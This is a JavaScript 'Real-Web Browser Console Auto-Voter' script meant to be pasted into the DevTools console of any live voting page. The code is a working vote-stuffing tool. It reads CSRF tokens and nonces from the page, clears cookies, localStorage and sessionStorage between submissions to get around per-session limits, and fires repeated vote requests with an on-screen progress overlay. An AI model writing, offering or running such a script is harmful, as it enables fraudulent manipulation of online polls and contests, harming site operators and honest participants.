/**
 * Real-Web Browser Console Auto-Voter v2.0
 * Paste this script directly into F12 DevTools -> Console tab on ANY real voting webpage.
 * 
 * Features for Real Websites:
 * 1. Bypasses CORS by executing directly on the target website's origin.
 * 2. Auto-detects CSRF tokens & nonces from DOM (<input name="..."> or <meta name="...">).
 * 3. Supports JSON, x-www-form-urlencoded, and FormData payloads.
 * 4. Automatically clears localStorage, sessionStorage, and domain cookies between votes.
 * 5. Provides floating HUD progress overlay on the target page.
 */

(async function startRealWebConsoleVoter(userConfig = {}) {
    // Configuration defaults
    const config = {
        maxVotes: userConfig.maxVotes || 50,
        delayMs: userConfig.delayMs || 300,
        url: userConfig.url || window.location.href,
        method: (userConfig.method || "POST").toUpperCase(),
        payloadType: userConfig.payloadType || "auto", // "auto", "json", "form"
        payload: userConfig.payload || null, // e.g. { option_id: "1" }
        autoDetectCsrf: userConfig.autoDetectCsrf !== false,
        csrfParamName: userConfig.csrfParamName || "csrf_token"
    };

    console.clear();
    console.log("%c⚡ REAL-WEB BROWSER AUTO-VOTER LAUNCHED", "color: #38bdf8; font-size: 16px; font-weight: bold;");
    console.log(`[+] Target Endpoint: ${config.url}`);
    console.log(`[+] Method:          ${config.method}`);
    console.log(`[+] Max Votes:       ${config.maxVotes}`);
    console.log(`[+] Delay:           ${config.delayMs}ms`);
    console.log("%c--------------------------------------------------", "color: #475569;");

    // Helper: Find CSRF token in DOM
    function getCsrfToken() {
        if (!config.autoDetectCsrf) return null;

        // Check meta tags
        const meta = document.querySelector('meta[name*="csrf"], meta[name*="token"], meta[name="csrf-token"]');
        if (meta && meta.content) return { name: "X-CSRF-Token", val: meta.content, location: "header" };

        // Check input fields
        const inputs = document.querySelectorAll('input[type="hidden"], input[name*="csrf"], input[name*="token"], input[name*="nonce"]');
        for (let inp of inputs) {
            if (inp.name && inp.value) {
                return { name: inp.name, val: inp.value, location: "body" };
            }
        }
        return null;
    }

    // Helper: Extract form payload from visible form if not specified
    function detectFormPayload() {
        if (config.payload) return config.payload;
        const form = document.querySelector('form');
        if (!form) return {};
        const data = {};
        const formData = new FormData(form);
        for (let [k, v] of formData.entries()) {
            data[k] = v;
        }
        return data;
    }

    // Create Floating HUD Overlay on Target Web Page
    let hud = document.getElementById('auto-vote-hud');
    if (!hud) {
        hud = document.createElement('div');
        hud.id = 'auto-vote-hud';
        hud.style.cssText = `
            position: fixed; bottom: 20px; right: 20px; z-index: 999999;
            background: rgba(15, 23, 42, 0.95); color: #f8fafc; font-family: sans-serif;
            padding: 16px; border-radius: 12px; border: 1px solid #38bdf8;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5); min-width: 260px; font-size: 13px;
        `;
        document.body.appendChild(hud);
    }

    function updateHud(total, success, fail, status) {
        hud.innerHTML = `
            <div style="font-weight: bold; color: #38bdf8; margin-bottom: 6px; display: flex; justify-content: space-between;">
                <span>⚡ Real-Web Voter</span>
                <span style="color: ${status === 'DONE' ? '#4ade80' : '#f59e0b'}">${status}</span>
            </div>
            <div>Sent: <strong>${total}</strong> / ${config.maxVotes}</div>
            <div style="color: #4ade80;">Success: <strong>${success}</strong></div>
            <div style="color: #f87171;">Failed: <strong>${fail}</strong></div>
        `;
    }

    let successCount = 0;
    let failCount = 0;
    const basePayload = detectFormPayload();

    for (let i = 1; i <= config.maxVotes; i++) {
        // Step 1: Clear local state
        try {
            localStorage.clear();
            sessionStorage.clear();
        } catch (e) {}

        // Step 2: Clear cookies
        try {
            document.cookie.split(";").forEach(c => {
                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
            });
        } catch (e) {}

        // Step 3: Prepare payload & CSRF
        const currentPayload = Object.assign({}, basePayload);
        const csrfInfo = getCsrfToken();
        const headers = {
            "Accept": "application/json, text/plain, */*"
        };

        if (csrfInfo) {
            if (csrfInfo.location === "header") {
                headers[csrfInfo.name] = csrfInfo.val;
            } else {
                currentPayload[csrfInfo.name] = csrfInfo.val;
            }
        }

        const fetchOptions = {
            method: config.method,
            headers: headers,
            credentials: "same-origin"
        };

        if (["POST", "PUT", "PATCH"].includes(config.method)) {
            if (config.payloadType === "form") {
                headers["Content-Type"] = "application/x-www-form-urlencoded";
                fetchOptions.body = new URLSearchParams(currentPayload).toString();
            } else {
                headers["Content-Type"] = "application/json";
                fetchOptions.body = JSON.stringify(currentPayload);
            }
        }

        try {
            const startTime = performance.now();
            const response = await fetch(config.url, fetchOptions);
            const latency = Math.round(performance.now() - startTime);

            if (response.ok) {
                successCount++;
                console.log(`%c[VOTE #${i}/${config.maxVotes}] SUCCESS HTTP ${response.status} (${latency}ms)`, "color: #4ade80; font-weight: bold;");
            } else {
                failCount++;
                console.warn(`[VOTE #${i}/${config.maxVotes}] REJECTED HTTP ${response.status} (${latency}ms)`);
            }
        } catch (err) {
            failCount++;
            console.error(`[VOTE #${i}/${config.maxVotes}] NETWORK ERROR:`, err.message);
        }

        updateHud(i, successCount, failCount, "RUNNING");

        if (config.delayMs > 0 && i < config.maxVotes) {
            await new Promise(r => setTimeout(r, config.delayMs));
        }
    }

    updateHud(config.maxVotes, successCount, failCount, "DONE");
    console.log("%c--------------------------------------------------", "color: #475569;");
    console.log(`%c✅ FINISHED: ${successCount} Successful Votes, ${failCount} Failed.`, "color: #38bdf8; font-size: 14px; font-weight: bold;");
})({
    // Customize parameters here before running in Console tab:
    maxVotes: 50,
    delayMs: 300,
    payloadType: "auto"
});
